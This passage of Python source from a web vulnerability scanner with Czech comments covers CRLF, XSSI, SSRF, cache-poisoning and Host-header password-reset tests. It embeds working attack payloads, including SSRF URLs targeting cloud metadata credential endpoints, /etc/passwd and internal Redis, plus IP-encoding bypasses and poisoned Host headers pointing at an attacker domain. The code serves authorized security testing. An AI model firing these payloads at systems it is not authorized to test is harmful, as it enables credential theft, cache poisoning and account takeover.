            elif body_hit_with_raw_crlf:
                # v10.21: NEpotvrzený header split — server jen zrcadlí
                # parametr (včetně syrového CR/LF + našeho header-řádku) do
                # TĚLA. To NENÍ HTTP response splitting (žádná hlavička se
                # nerozdělila, header_hit=False) — v běžném HTML je CR/LF jen
                # whitespace. Echo vstupu do stránky je extrémně časté, takže
                # hlásit to jako medium "CRLF injection" je nadhodnocené a
                # kazí signál. Ponecháváme to ale VIDITELNÉ v hitech jako
                # info — slabý signál (server nesanitizuje CR/LF), který stojí
                # za ruční ověření pravosti / vyloučení FP.
                severity = "info"
                description = (
                    f"Reflected raw CR/LF in response body — parameter "
                    f"'{param_name}'. Server preserves raw CR/LF + injected "
                    f"header line in the BODY, but no HTTP header was split "
                    f"(not confirmed response-splitting). Weak signal / "
                    f"possible false positive — MANUAL VERIFICATION REQUIRED "
                    f"(check for real header injection, log injection, or "
                    f"HTML smuggling)."
                )
            else:
                # Jen marker reflection bez raw CR/LF — pravděpodobně
                # safe escape (HTML entity, JS string, atd.).
                # Downgrade na low + jasný popis.
                severity = "low"
                description = (
                    f"Reflected marker in body (no raw CR/LF detected) "
                    f"— parameter '{param_name}'. Likely safe HTML "
                    f"escape; verify manually if context-sensitive."
                )

            finding = {
                "kind": "crlf",
                "url": test_url,
                "param": param_name,
                "payload": payload[:80],
                "header_hit": header_hit,
                "header_hit_name": header_hit_name,
                "body_hit": body_hit,
                "severity": severity,
                "cwe": "CWE-93",
                "description": description,
            }
            param_findings_for_this.append(finding)

        # Vyber finding s nejvyšší severity pro tento parametr (snížení
        # šumu — nedáváme 6 findings za stejnou díru, jen nejhlubší).
        if param_findings_for_this:
            severity_rank = {
                "critical": 4, "high": 3, "medium": 2, "low": 1,
            }
            param_findings_for_this.sort(
                key=lambda f: severity_rank.get(f["severity"], 0),
                reverse=True,
            )
            top_finding = param_findings_for_this[0]
            findings.append(top_finding)
            if on_log:
                try:
                    on_log(
                        f"[CRLF] {top_finding['severity'].upper()} — param "
                        f"'{param_name}' "
                        f"{'header injection' if top_finding['header_hit'] else 'body reflection'} "
                        f"(payload variants tested: "
                        f"{len(param_findings_for_this)})",
                        ("warning"
                         if top_finding["severity"] in ("high", "critical")
                         else "info"),
                    )
                except Exception:
                    pass

    return findings




# ─── v10.14: XSSI (Cross-Site Script Inclusion) detection ──────────────────
# Non-destructive — testuje, jestli endpoint vrací sensitive obsah, který
# může být loaded jako <script src="..."> z jiného origin a cross-origin
# přečten skrze:
#   1. Callback parameter reflection (JSONP) — útočník nastaví callback=...
#      a hodnotu získá ve své funkci.
#   2. Pure JSON arrays `[...]` — starší prohlížeče volaly Array
#      constructor → readable cross-origin (dnes safe v moderních
#      browserech ale signál špatné praxe).
#   3. JS-parseable JSON s function calls / global var assignments
#      → readable přes vlastní Function.prototype override.
#
# Detekuje:
#   - CRITICAL: callback parameter reflection s sensitive data
#   - HIGH: JSONP endpoint bez authentication / origin check
#   - MEDIUM: Pure JSON array s sensitive looking content
#   - INFO: JSON endpoint bez X-Content-Type-Options: nosniff

# Sensitive data patterns — heuristika pro detekci useful obsahu
_XSSI_SENSITIVE_PATTERNS = [
    re.compile(r'\b(?:email|e-mail)["\']?\s*:\s*["\'][^"\']+@', re.I),
    re.compile(r'\b(?:token|api[_-]?key|session[_-]?id|csrf)["\']?\s*:', re.I),
    re.compile(r'\b(?:password|passwd|secret)["\']?\s*:', re.I),
    re.compile(r'\b(?:phone|telephone|mobile)["\']?\s*:\s*["\']?\+?\d', re.I),
    re.compile(r'\b(?:ssn|tax[_-]?id|account[_-]?number)["\']?\s*:', re.I),
    re.compile(r'\b(?:user[_-]?id|userId|customerId)["\']?\s*:\s*\d', re.I),
    # User-related
    re.compile(r'"(?:firstName|lastName|fullName|username)"\s*:', re.I),
    # Internal IDs / addresses
    re.compile(r'"(?:internalId|address|zipCode|street)"\s*:', re.I),
]


def xssi_scan(session: requests.Session,
              url: str,
              timeout: float = 8.0,
              on_log: Optional[Callable] = None) -> List[Dict]:
    """Test XSSI vulnerability na URL endpointu.

    Vrátí seznam findings.

    Strategy:
      1. GET original URL — kontroluje content type, body shape
      2. GET s ?callback=XSGSCallback&jsonp=XSGSCallback — kontroluje
         callback reflection (JSONP detection)
      3. Analyzuje response body na sensitive content + JS-parseability
    """
    findings: List[Dict] = []

    if not url:
        return findings

    # Test 1: Original GET — uvidíme content type + body
    try:
        r = session.get(url, timeout=timeout, allow_redirects=False)
    except _NET_EXCEPTIONS:
        return findings

    if r is None:
        return findings

    content_type = (r.headers.get("Content-Type") or "").lower()
    nosniff = ((r.headers.get("X-Content-Type-Options") or "").lower()
               == "nosniff")
    body_text = ""
    try:
        body_text = r.text[:200000]  # cap 200KB
    except Exception:
        return findings

    if not body_text:
        return findings

    # Bail out pokud response je HTML (XSSI vyžaduje JS-parseable obsah)
    if content_type.startswith("text/html"):
        return findings

    body_stripped = body_text.strip()

    # Heuristika: má obsah sensitive data?
    sensitive_match_count = 0
    for pat in _XSSI_SENSITIVE_PATTERNS:
        if pat.search(body_text):
            sensitive_match_count += 1
            if sensitive_match_count >= 2:
                break  # 2+ matches stačí

    # Test 2: JSONP callback reflection
    # Pošli s callback= parametrem a kontroluje response
    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    callback_marker = "XSGSCallback_v10_14"
    from urllib.parse import parse_qsl, urlencode

    existing_params = parse_qsl(parsed.query, keep_blank_values=True)
    # Zkus 2 nejčastější callback parameter names
    # v10.14: rozšířený list — pokrývá Google ('jsonpCallback'),
    # běžné aliasy ('cb', 'jsoncallback', '_jsonp'), framework specifické
    for cb_param in ("callback", "jsonp", "jsonpCallback",
                       "jsoncallback", "cb", "_jsonp",
                       "_callback", "json_callback"):
        test_params = list(existing_params) + [(cb_param, callback_marker)]
        try:
            modified_query = urlencode(test_params)
            test_url = parsed._replace(query=modified_query).geturl()
        except Exception:
            continue

        try:
            r2 = session.get(test_url, timeout=timeout,
                             allow_redirects=False)
        except _NET_EXCEPTIONS:
            continue

        if r2 is None:
            continue

        try:
            cb_body = r2.text[:200000]
        except Exception:
            continue

        # JSONP detection: response začíná `<callback>(` nebo
        # obsahuje `<callback>(...)`
        if callback_marker in cb_body:
            # Verify že je to opravdu funkční JSONP, ne jen reflection
            # v JSON value
            if (cb_body.lstrip().startswith(callback_marker + "(") or
                    f"{callback_marker}(" in cb_body[:200]):
                # v10.25 FP gate: callback reflexe SAMA O SOBĚ je JSONP design
                # pattern, ne XSSI vuln. XSSI riziko = únik CITLIVÝCH dat
                # cross-origin. Bez sensitive dat → info + fp_risk; 1 signál →
                # medium + fp_risk; ≥2 → high (potvrzený leak).
                if sensitive_match_count >= 2:
                    severity = "high"
                    _xssi_fp = False
                    _xssi_reason = None
                elif sensitive_match_count == 1:
                    severity = "medium"
                    _xssi_fp = True
                    _xssi_reason = ("JSONP callback reflection + 1 sensitive-"
                                    "data signal — possible XSSI leak; verify "
                                    "the exposed data is actually sensitive.")
                else:
                    severity = "info"
                    _xssi_fp = True
                    _xssi_reason = ("JSONP callback reflection but NO sensitive "
                                    "data observed in response — JSONP is a "
                                    "common design pattern, not a confirmed "
                                    "XSSI leak. Manual verification required.")
                description = (
                    f"JSONP callback reflection on '{cb_param}' parameter. "
                    f"Server wraps response with attacker-controlled "
                    f"function name → readable cross-origin via "
                    f"<script src='{test_url}'>.")
                findings.append({
                    "kind": "xssi",
                    "url": test_url,
                    "param": cb_param,
                    "payload": f"{cb_param}={callback_marker}",
                    "attack_type": "jsonp_callback_reflection",
                    "content_type": content_type,
                    "sensitive_data_likely": sensitive_match_count > 0,
                    "severity": severity,
                    "fp_risk": _xssi_fp,
                    "fp_reason": _xssi_reason,
                    "cwe": "CWE-829",  # Inclusion of Functionality from
                                       # Untrusted Control Sphere
                    "description": description,
                })
                if on_log:
                    try:
                        on_log(
                            f"[XSSI] {severity.upper()} — JSONP reflection "
                            f"on param '{cb_param}' at {url}",
                            "warning",
                        )
                    except Exception:
                        pass
                break  # stop after first callback hit

    # Test 3: Pure JSON array s sensitive content
    # Response začíná `[` a content type indikuje JSON
    is_json_array = (
        body_stripped.startswith("[") and
        ("json" in content_type or content_type.startswith("application/"))
    )
    if is_json_array and sensitive_match_count >= 1 and not nosniff:
        # Toto je legacy XSSI vector — moderní browsery to neumožní
        # přečíst, ale starší / mobile webviews ano
        severity = "medium"
        description = (
            "JSON array endpoint without X-Content-Type-Options: nosniff. "
            "Contains sensitive-looking data. In older browsers / mobile "
            "webviews readable cross-origin via Array constructor "
            "override. Mitigation: prefix response with `)]}',` or "
            "use object root.")
        findings.append({
            "kind": "xssi",
            "url": url,
            "param": "(root)",
            "payload": "(no payload — passive check)",
            "attack_type": "json_array_readable",
            "content_type": content_type,
            "sensitive_data_likely": True,
            "severity": severity,
            "cwe": "CWE-829",
            "description": description,
        })
        if on_log:
            try:
                on_log(
                    f"[XSSI] {severity.upper()} — JSON array without nosniff "
                    f"at {url}",
                    "info",
                )
            except Exception:
                pass

    # Test 4: Missing X-Content-Type-Options: nosniff na JSON endpointu
    # — informativní (low impact ale signál špatné praxe)
    is_json_content = ("json" in content_type or
                       body_stripped.startswith(("[", "{")))
    if is_json_content and not nosniff and not findings:
        # Jen pokud jsme nic jiného nenašli, zaznamenej jako INFO
        # (aby šel signál, ale nešumělo to)
        if sensitive_match_count >= 2:
            findings.append({
                "kind": "xssi",
                "url": url,
                "param": "(headers)",
                "payload": "(no payload — passive check)",
                "attack_type": "missing_nosniff",
                "content_type": content_type,
                "sensitive_data_likely": True,
                "severity": "low",
                "cwe": "CWE-829",
                "description": (
                    "JSON endpoint with sensitive data but missing "
                    "X-Content-Type-Options: nosniff header. While not "
                    "directly exploitable in modern browsers, indicates "
                    "weak defense-in-depth posture."),
            })

    # v10.14: Test 5 — JavaScript endpoint s global var / function call.
    # Pokud Content-Type je application/javascript a body obsahuje
    # "var X = {...}", lze to include cross-origin přes <script src=...>
    # a číst přes window.X override.
    is_javascript = (
        "javascript" in content_type or
        "ecmascript" in content_type
    )
    if is_javascript and not findings:
        js_global_pattern = re.compile(
            r'^\s*(?:var|let|const|window\.)\s*([a-zA-Z_$][\w$]*)\s*=\s*[{\[]',
            re.MULTILINE
        )
        global_matches = js_global_pattern.findall(body_text)
        if global_matches and sensitive_match_count >= 1:
            severity = "high"
            description = (
                f"JavaScript endpoint exposes global variable(s) "
                f"{global_matches[:5]} with sensitive data. Loading "
                f"via <script src='...'> from attacker origin → "
                f"window.{global_matches[0]} readable cross-origin "
                f"(XSSI executable)."
            )
            findings.append({
                "kind": "xssi",
                "url": url,
                "param": "(JS global)",
                "payload": "(no payload — passive check)",
                "attack_type": "js_global_var",
                "content_type": content_type,
                "sensitive_data_likely": True,
                "globals_exposed": global_matches[:5],
                "severity": severity,
                "cwe": "CWE-829",
                "description": description,
            })
            if on_log:
                try:
                    on_log(
                        f"[XSSI] {severity.upper()} — JS global var "
                        f"exposure ({global_matches[:3]}) at {url}",
                        "warning",
                    )
                except Exception:
                    pass

    # v10.14: Test 6 — credential / token reflection v JSON response.
    # Pokud JSON obsahuje Authorization / API key / CSRF token / OAuth,
    # útočník to exfiltruje cross-origin pokud CORS je permisivní.
    if not findings and ("json" in content_type or
                          body_stripped.startswith(("[", "{"))):
        cred_patterns = [
            (re.compile(
                r'"(?:Authorization|X-API-Key|X-Auth-Token)"\s*:',
                re.I), "auth_header_in_json"),
            (re.compile(r'"Cookie"\s*:\s*"[^"]{20,}"', re.I),
             "cookie_in_json"),
            (re.compile(
                r'"(?:csrf[_-]?token|xsrf[_-]?token)"\s*:\s*"',
                re.I), "csrf_in_json"),
            (re.compile(
                r'"access_token"\s*:\s*"[a-zA-Z0-9._-]{20,}"',
                re.I), "oauth_token_in_json"),
        ]
        for pat, attack in cred_patterns:
            if pat.search(body_text):
                severity = "high"
                description = (
                    f"JSON endpoint contains credential / token "
                    f"reflection ({attack}). If lacking proper "
                    f"CORS protection, attacker can extract via "
                    f"XHR cross-origin."
                )
                findings.append({
                    "kind": "xssi",
                    "url": url,
                    "param": "(body)",
                    "payload": "(no payload — passive check)",
                    "attack_type": attack,
                    "content_type": content_type,
                    "sensitive_data_likely": True,
                    "severity": severity,
                    "cwe": "CWE-829",
                    "description": description,
                })
                if on_log:
                    try:
                        on_log(
                            f"[XSSI] {severity.upper()} — credential "
                            f"reflection ({attack}) at {url}",
                            "warning",
                        )
                    except Exception:
                        pass
                break

    return findings




# ─── v10.14: SSRF (Server-Side Request Forgery) detection ───────────────────
# Non-destructive — pošle URL parametry s payloady cílící cloud metadata
# services, internal hosts, a bypass techniques. Analyzuje response na
# patterns typické pro úspěšný SSRF.
#
# Detekce ve 3 vrstvách:
#   1. Direct: response obsahuje cloud metadata patterns (ami-id, atd.)
#   2. Differential: response time/size anomálie vs baseline (target ne
#      reachable hosts mají typicky stejnou response, reachable = timeout
#      nebo různé chování)
#   3. Error message leakage: stack traces obsahující "Connection refused",
#      "URLError", "ECONNREFUSED", atd.
#
# CWE-918: Server-Side Request Forgery


# URL-like parameter names (heuristika pro výběr params k testování)
_SSRF_URL_PARAMS = {
    # Obvious URL params
    "url", "uri", "link", "src", "source", "href", "target",
    # Redirect-related
    "redirect", "redirect_to", "redirect_uri", "redirecturl", "return",
    "return_to", "returnto", "return_url", "returnurl", "next", "goto",
    "continue", "callback_url", "successurl", "failureurl",
    # File-fetch related
    "file", "filename", "path", "download", "image", "image_url",
    "img", "imgurl", "logo", "thumbnail", "avatar", "icon",
    # API/proxy fetch
    "fetch", "proxy", "feed", "rss", "request", "remote", "load",
    "endpoint", "api", "api_url", "webhook", "callback",
    # Service-specific
    "host", "domain", "server", "site", "address", "ip",
}

# Cloud metadata + internal service payloads
_SSRF_PAYLOADS = [
    # ── AWS EC2 metadata service (IMDSv1 — bez tokenu) ──
    ("http://169.254.169.254/latest/meta-data/",
     "aws_imdsv1",
     ["ami-id", "instance-id", "placement/", "iam/"]),
    # AWS IMDSv2 vyžaduje PUT token — detekuje se přes HTTP 401
    # response signature
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "aws_iam_creds",
     ["AccessKeyId", "SecretAccessKey", "Token"]),
    # ── GCP metadata service ──
    ("http://metadata.google.internal/computeMetadata/v1/",
     "gcp_metadata",
     ["computeMetadata", "instance/", "project/"]),
    ("http://metadata.google.internal/computeMetadata/v1/"
     "instance/service-accounts/default/token",
     "gcp_sa_token",
     ["access_token", "expires_in", "token_type"]),
    # ── Azure IMDS ──
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "azure_imds",
     ["compute", "network", "subscriptionId"]),
    # ── Internal services (common ports) ──
    ("http://127.0.0.1:22/",
     "ssh_internal",
     ["SSH-2.0", "SSH-1.99", "OpenSSH"]),
    ("http://127.0.0.1:6379/",
     "redis_internal",
     ["+PONG", "ERR wrong number", "redis_version"]),
    ("http://127.0.0.1:9200/",
     "elasticsearch_internal",
     ["\"cluster_name\"", "\"tagline\"", "\"version\""]),
    ("http://127.0.0.1:5984/",
     "couchdb_internal",
     ["\"couchdb\":\"Welcome\"", "\"version\":"]),
    ("http://127.0.0.1:11211/stats",
     "memcached_internal",
     ["STAT pid", "STAT uptime"]),
    # ── localhost variants (bypass IP filters) ──
    ("http://localhost/",
     "localhost_plain",
     None),  # není specific pattern — jen connection success
    # Decimal IP encoding (127.0.0.1)
    ("http://2130706433/",
     "decimal_ip_bypass",
     None),
    # Hex IP encoding
    ("http://0x7f000001/",
     "hex_ip_bypass",
     None),
    # IPv6 localhost
    ("http://[::1]/",
     "ipv6_localhost",
     None),
    # Decimal IP for AWS metadata: 169.254.169.254 = 2852039166
    ("http://2852039166/latest/meta-data/",
     "aws_imds_decimal",
     ["ami-id", "instance-id"]),
    # ── URL parser confusion ──
    # @-trick: server může parsovat jen 'evil.com', backend HTTP klient
    # parsuje '169.254.169.254' jako host
    ("http://evil.example.com#@169.254.169.254/latest/meta-data/",
     "url_fragment_bypass",
     ["ami-id"]),
    ("http://169.254.169.254%23@evil.example.com/",
     "url_at_bypass",
     None),
    # ── Protocol switch (file://, gopher://) ──
    ("file:///etc/passwd",
     "file_protocol",
     ["root:x:", "/bin/bash", "/bin/sh"]),
    ("file:///etc/hostname",
     "file_protocol_hostname",
     None),
    ("file://C:/Windows/win.ini",
     "file_protocol_windows",
     ["[fonts]", "[extensions]", "[mci extensions]"]),
    ("gopher://127.0.0.1:6379/_INFO%0d%0aQUIT",
     "gopher_redis",
     ["redis_version", "+PONG"]),
    # dict:// — querying dictd or as port-scan
    ("dict://127.0.0.1:6379/info",
     "dict_redis",
     ["redis_version"]),
]

# Error patterns signalizující SSRF se pokusil o connection (info leak)
_SSRF_ERROR_PATTERNS = [
    re.compile(r"\bConnection refused\b", re.I),
    re.compile(r"\bECONNREFUSED\b"),
    re.compile(r"\bUnable to connect\b", re.I),
    re.compile(r"\bConnection timed out\b", re.I),
    re.compile(r"\bETIMEDOUT\b"),
    re.compile(r"\bcurl: \(\d+\)", re.I),  # curl error codes
    re.compile(r"\bURLError:", re.I),  # Python urllib
    re.compile(r"\bSocketError\b", re.I),
    re.compile(r"\bgetaddrinfo failed\b", re.I),
    re.compile(r"\bHostNotFound\b", re.I),
    re.compile(r"\bNo route to host\b", re.I),
]


def ssrf_scan(session: requests.Session,
              url: str,
              timeout: float = 8.0,
              on_log: Optional[Callable] = None,
              max_payloads_per_param: int = 8) -> List[Dict]:
    """Test SSRF na URL parametrech, které vypadají jako URL fetch params.

    Strategie:
      1. Z URL query stringu vybere parametry, jejichž název je v
         _SSRF_URL_PARAMS NEBO hodnota začíná http://, https://, //
      2. Pro každý takový parametr posílá SSRF payloady
      3. Analyzuje response na patterns z metadata services + error msgs

    Args:
        max_payloads_per_param: limit payloadů per parametr (proti time
            blow-up). Default 8 = ~prvních 8 payloads z _SSRF_PAYLOADS.
    """
    findings: List[Dict] = []

    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    from urllib.parse import parse_qsl, urlencode

    query_params = parse_qsl(parsed.query, keep_blank_values=True)
    if not query_params:
        return findings

    # Vyber kandidátní parametry — URL-like name nebo URL-like value
    candidates = []
    for pname, pvalue in query_params:
        name_match = pname.lower() in _SSRF_URL_PARAMS
        value_match = (
            pvalue.startswith(("http://", "https://", "//")) or
            "://" in pvalue
        )
        if name_match or value_match:
            candidates.append((pname, pvalue))

    if not candidates:
        return findings

    # Baseline response (s původním parametrem) — pro differential
    try:
        baseline = session.get(url, timeout=timeout, allow_redirects=False)
        baseline_body = (baseline.text or "")[:200000]
        baseline_status = baseline.status_code
        baseline_size = len(baseline_body)
    except _NET_EXCEPTIONS:
        baseline_body = ""
        baseline_status = 0
        baseline_size = 0

    for param_name, original_value in candidates:
        param_findings_count = 0

        for ssrf_url, attack_type, expected_patterns in (
                _SSRF_PAYLOADS[:max_payloads_per_param]):
            if param_findings_count >= 2:
                # Limit 2 findings per param (snížení šumu)
                break
            # Sestav test URL
            test_params = []
            for pn, pv in query_params:
                if pn == param_name:
                    test_params.append((pn, ssrf_url))
                else:
                    test_params.append((pn, pv))
            try:
                modified_query = urlencode(test_params, safe="%:/@?#")
                test_url = parsed._replace(query=modified_query).geturl()
            except Exception:
                continue

            try:
                r = session.get(test_url, timeout=timeout,
                                allow_redirects=False)
            except _NET_EXCEPTIONS as e:
                # Connection error — někdy znamená SSRF byl pokus (server
                # spadl na konkrétním backend requestu). Tady ale nelze
                # rozlišit, takže skip.
                continue

            if r is None:
                continue

            body_text = ""
            try:
                body_text = r.text[:200000]
            except Exception:
                pass

            # ── Vrstva 1: Direct match metadata patterns ──
            pattern_hits = []
            if expected_patterns:
                # v10.25 REFLECTION GUARD: server může injektovaný ssrf_url jen
                # ZRCADLIT do body (echo vstupu). Pak by metadata pattern, který
                # je SOUČÁSTÍ našeho payloadu (např. "meta-data", "169.254...",
                # "latest"), matchnul reflexi — NE reálný fetch → FP CRITICAL.
                # Před matchem odstraníme všechny výskyty injektovaného payloadu
                # (i URL-decoded variantu), takže matchne jen SKUTEČNÝ obsah
                # vrácený z fetchnuté metadata služby (ami-id, instance-id,
                # AccessKeyId, …), který se v naší injektované URL nevyskytuje.
                _body_for_match = body_text.replace(ssrf_url, "")
                try:
                    from urllib.parse import unquote as _unq
                    _body_for_match = _body_for_match.replace(_unq(ssrf_url), "")
                except Exception:
                    pass
                for pat in expected_patterns:
                    # navíc: pattern, který je sám podřetězcem injektovaného
                    # payloadu, nikdy nepočítáme (čistá reflexe).
                    if pat in ssrf_url:
                        continue
                    if pat in _body_for_match:
                        pattern_hits.append(pat)
                # Pokud match → CRITICAL finding
                if pattern_hits:
                    severity = "critical"
                    description = (
                        f"SSRF CONFIRMED — server fetched "
                        f"'{ssrf_url}' via parameter '{param_name}' "
                        f"and returned response containing "
                        f"{pattern_hits[:3]} patterns. This is "
                        f"unauthorized internal/metadata access."
                    )
                    findings.append({
                        "kind": "ssrf",
                        "url": test_url,
                        "param": param_name,
                        "payload": ssrf_url,
                        "attack_type": attack_type,
                        "patterns_matched": pattern_hits,
                        "response_status": r.status_code,
                        "severity": severity,
                        "cwe": "CWE-918",
                        "description": description,
                    })
                    param_findings_count += 1

                    if on_log:
                        try:
                            on_log(
                                f"[SSRF] CRITICAL — param "
                                f"'{param_name}' → {attack_type} "
                                f"(matched: {pattern_hits[:3]})",
                                "warning",
                            )
                        except Exception:
                            pass
                    continue  # next payload — měli jsme hit

            # ── Vrstva 2: Error message leakage ──
            for err_pat in _SSRF_ERROR_PATTERNS:
                m = err_pat.search(body_text)
                if m:
                    # Error message v response = backend pokusil o
                    # connection a selhal → SSRF EXISTS, jen target
                    # byl filtered.
                    severity = "high"
                    description = (
                        f"SSRF likely — server attempted to fetch "
                        f"'{ssrf_url}' via parameter '{param_name}' "
                        f"and leaked error '{m.group(0)}' in response. "
                        f"Backend tried connection (= SSRF endpoint "
                        f"exists). Specific target may be blocked."
                    )
                    findings.append({
                        "kind": "ssrf",
                        "url": test_url,
                        "param": param_name,
                        "payload": ssrf_url,
                        "attack_type": f"{attack_type}_errorleak",
                        "error_pattern": m.group(0),
                        "response_status": r.status_code,
                        "severity": severity,
                        "cwe": "CWE-918",
                        "description": description,
                    })
                    param_findings_count += 1

                    if on_log:
                        try:
                            on_log(
                                f"[SSRF] HIGH — param "
                                f"'{param_name}' → error leak "
                                f"({m.group(0)[:40]})",
                                "warning",
                            )
                        except Exception:
                            pass
                    break  # one error per payload

            # ── Vrstva 3: Differential response (size/status anomálie) ──
            # Pokud baseline vs test response výrazně liší (size > 50% diff
            # nebo status jiný), může indikovat SSRF
            if baseline_status and r.status_code != baseline_status:
                size_diff = abs(len(body_text) - baseline_size)
                if size_diff > 100:  # ignore tiny noise
                    # Jen jako weak signal — MEDIUM severity, requires verify
                    severity = "medium"
                    description = (
                        f"Possible SSRF — parameter '{param_name}' with "
                        f"SSRF payload '{ssrf_url}' caused differential "
                        f"response (baseline {baseline_status}/"
                        f"{baseline_size}B vs test {r.status_code}/"
                        f"{len(body_text)}B). Server may process URL "
                        f"backend-side."
                    )
                    findings.append({
                        "kind": "ssrf",
                        "url": test_url,
                        "param": param_name,
                        "payload": ssrf_url,
                        "attack_type": f"{attack_type}_differential",
                        "baseline_status": baseline_status,
                        "baseline_size": baseline_size,
                        "test_status": r.status_code,
                        "test_size": len(body_text),
                        "severity": severity,
                        "cwe": "CWE-918",
                        "description": description,
                    })
                    param_findings_count += 1
                    # Differential je weak — ne logovat každý, jen aggregát
                    # později

    if on_log and not findings:
        try:
            on_log("[SSRF] No SSRF detected.", "info")
        except Exception:
            pass

    return findings




# ─── v10.14: DESTRUCTIVE SCANNERS — opt-in jen s explicitní autorizací ──────
# Tyto testy ZANECHÁVAJÍ persistent state na serveru. Aktivuje se jen pokud
# uživatel explicitně potvrdil autorizaci přes GUI dialog (destructive_enabled
# flag). Použít POUZE proti autorizovaným cílům.
#
# Pokrývá:
#   1. Cache Poisoning — payload se cachne pro VŠECHNY návštěvníky
#   2. Host Header password reset — triggrne real email s útočnickým linkem
#   3. Stored XSS via headers — payload v Referer/UA se uloží do logů/admin


_DESTRUCTIVE_CACHE_MARKER = "XSGS-CachePoison-Marker"

# Cache poisoning probe headers — unkeyed headers které servers reflektují
_CACHE_POISON_HEADERS = [
    "X-Forwarded-Host",
    "X-Forwarded-Server",
    "X-Forwarded-Scheme",
    "X-Forwarded-Port",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Host",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Backend-Server",
]


def cache_poisoning_scan(session: requests.Session,
                          url: str,
                          timeout: float = 8.0,
                          on_log: Optional[Callable] = None) -> List[Dict]:
    """[DESTRUCTIVE] Test Cache Poisoning vulnerability.

    POZOR: Pokud server cachuje response, payload se SHOW VŠEM návštěvníkům!
    Spustit JEN s autorizací.

    Strategy:
      1. GET URL s X-Forwarded-Host: <marker>.evil.example.com
      2. Kontroluje, jestli marker se objeví v response body/Location
      3. Kontroluje cache hit indikátory (Age, X-Cache, CF-Cache-Status)
      4. Pokud reflection + cache hint → CRITICAL
    """
    findings: List[Dict] = []

    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    if not parsed.netloc:
        return findings

    target_host = parsed.netloc

    # Cache buster — random param aby každý test zasáhl jiný cache key
    cb_value = f"xsgs_cb_{int(time.time())}_{random.randint(1000, 9999)}"
    from urllib.parse import parse_qsl, urlencode
    existing_params = parse_qsl(parsed.query, keep_blank_values=True)
    test_params = list(existing_params) + [("_xsgs_cb", cb_value)]
    modified_query = urlencode(test_params)
    test_url = parsed._replace(query=modified_query).geturl()

    for header_name in _CACHE_POISON_HEADERS:
        poison_value = f"{_DESTRUCTIVE_CACHE_MARKER}.evil.example.com"
        # Pro X-Forwarded-Scheme zkouším jinou hodnotu (sheme)
        if "Scheme" in header_name:
            poison_value = f"javascript:{_DESTRUCTIVE_CACHE_MARKER}"
        elif "Port" in header_name:
            poison_value = "1337"
        elif header_name == "Forwarded":
            poison_value = (
                f"for=evil.example.com;host={_DESTRUCTIVE_CACHE_MARKER}.evil.example.com"
            )

        try:
            r = session.get(
                test_url,
                headers={header_name: poison_value, "Host": target_host},
                timeout=timeout,
                allow_redirects=False,
            )
        except _NET_EXCEPTIONS:
            continue

        if r is None:
            continue

        # Detekce reflection
        body_text = ""
        try:
            body_text = r.text[:200000]
        except Exception:
            pass

        body_hit = _DESTRUCTIVE_CACHE_MARKER in body_text
        # Location header hit
        location_hit = False
        for hname, hvalue in r.headers.items():
            if _DESTRUCTIVE_CACHE_MARKER in hvalue:
                if hname.lower() == "location":
                    location_hit = True
                    break

        if not (body_hit or location_hit):
            continue

        # Cache indicators
        cache_indicators = {}
        for hname in ("Age", "X-Cache", "X-Cache-Status",
                       "CF-Cache-Status", "X-Cache-Hits",
                       "X-Served-By", "X-Cache-Lookup"):
            v = r.headers.get(hname)
            if v:
                cache_indicators[hname] = v

        has_cache = bool(cache_indicators)

        # Severity — má cache hint?
        severity = "high"
        if has_cache:
            severity = "critical"
            description = (
                f"Cache poisoning CONFIRMED — header '{header_name}' "
                f"value reflected in response AND server uses cache "
                f"({list(cache_indicators.keys())}). Payload will "
                f"persist for all visitors of {url} until cache expires.")
        else:
            description = (
                f"Header injection — '{header_name}' value reflected, "
                f"no explicit cache headers (may still be cached by "
                f"upstream CDN). Manual verification recommended.")

        finding = {
            "kind": "cache-poisoning",
            "url": test_url,
            "header_injected": header_name,
            "payload_value": poison_value,
            "body_hit": body_hit,
            "location_hit": location_hit,
            "cache_indicators": cache_indicators,
            "severity": severity,
            "cwe": "CWE-444",  # HTTP Request/Response Smuggling
            "description": description,
            "destructive": True,
        }
        findings.append(finding)

        if on_log:
            try:
                on_log(
                    f"[DESTRUCTIVE/cache] {severity.upper()} — header "
                    f"'{header_name}' reflected (cache headers: "
                    f"{list(cache_indicators.keys()) or 'none'})",
                    "error",  # vždy error severity pro destructive
                )
            except Exception:
                pass

    return findings


# Host Header password reset trigger
_HOST_HEADER_RESET_PATHS = [
    "/password-reset",
    "/password/reset",
    "/forgot-password",
    "/forgot",
    "/reset",
    "/account/reset",
    "/user/forgot-password",
    "/api/auth/forgot-password",
    "/api/password-reset",
]


def host_header_reset_scan(session: requests.Session,
                            url: str,
                            test_email: str,
                            timeout: float = 8.0,
                            on_log: Optional[Callable] = None) -> List[Dict]:
    """[DESTRUCTIVE] Test Host Header injection s password reset trigger.

    POZOR: Pokud server používá Host header pro reset link, dojde k
    REÁLNÉMU emailu na test_email s odkazem směřujícím na útočníkův host!
    Spustit JEN s autorizací + test_email pod tvou kontrolou.

    Args:
        url: target base URL
        test_email: email adresa pod kontrolou pentestera

    Strategy:
      1. Discovery: zkusí common reset paths
      2. Pro každý nalezený endpoint pošle POST s evil Host
      3. Kontroluje response — pokud 200/302, email pravděpodobně odešel
    """
    findings: List[Dict] = []

    if not test_email or "@" not in test_email:
        if on_log:
            on_log(
                "[DESTRUCTIVE/hosthdr] No valid test_email provided — skipping",
                "warning",
            )
        return findings

    try:
        parsed = urlparse(url)
    except Exception:
        return findings

    if not parsed.netloc:
        return findings

    base = f"{parsed.scheme}://{parsed.netloc}"
    target_host = parsed.netloc
    evil_host = "xsgs-evil-attacker.example.com"

    for reset_path in _HOST_HEADER_RESET_PATHS:
        endpoint = base + reset_path

        # Nejdřív zkontroluj jestli endpoint existuje (GET, 200/302/405)
        try:
            probe = session.get(endpoint, timeout=timeout,
                                allow_redirects=False,
                                headers={"Host": target_host})
            if probe.status_code in (404, 410):
                continue  # endpoint neexistuje
        except _NET_EXCEPTIONS:
            continue

        # POST s evil Host
        try:
            r = session.post(
                endpoint,
                data={"email": test_email, "username": test_email},
                headers={"Host": evil_host, "X-Forwarded-Host": evil_host},
                timeout=timeout,
